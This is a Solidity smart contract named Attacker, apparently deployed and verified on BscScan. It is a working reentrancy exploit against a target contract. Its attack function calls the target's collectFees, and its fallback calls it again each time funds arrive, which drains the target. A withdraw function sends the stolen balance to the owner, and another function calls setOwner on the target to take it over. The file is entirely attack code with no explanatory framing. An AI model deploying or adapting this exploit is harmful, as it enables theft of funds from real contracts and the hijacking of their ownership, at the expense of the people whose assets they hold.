/**
 *Submitted for verification at BscScan.com on 2022-12-16
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

interface DoubleTx {
        function collectFees() external;
        function setOwner(address _owner) external;
    }

contract Attacker {

    DoubleTx public target;
    address public owner;

    constructor(){
        owner = msg.sender;
    }

    function setTarget(address _target) public onlyOwner{
        target=DoubleTx(_target);
    }

    function attack() public onlyOwner{
        target.collectFees();
    }

    function showBalance() public view returns(uint256){
        return(address(this).balance);
    }

    function withdrow() public onlyOwner{
        (bool os, ) = payable(owner).call{value: address(this).balance}("");
        require(os);
    }

    function changeTargetOwner(address _owner) public onlyOwner{
        target.setOwner(_owner);
    }

    fallback() external payable {
        if (address(target).balance >= 10 wei){
            target.collectFees();
        }
    }

    function showTargetBalance() public view returns(uint256){
        return(address(target).balance);
    }

    modifier onlyOwner {
        require(
            msg.sender == owner,
            "Only owner can call this function."
        );
        _;
    }

}